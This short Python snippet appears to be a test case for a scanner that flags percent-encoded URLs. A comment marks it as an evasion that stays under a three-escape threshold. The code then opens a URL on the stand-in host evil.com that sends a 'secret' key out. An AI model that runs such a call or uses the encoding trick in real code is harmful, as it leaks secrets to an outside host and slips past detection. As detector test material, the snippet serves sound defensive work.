# Evasion: only 2 consecutive %XX (threshold is 3+)
url = 'https://evil.com/c%6Fllect?key=%73ecret'
import urllib.request
urllib.request.urlopen(url)
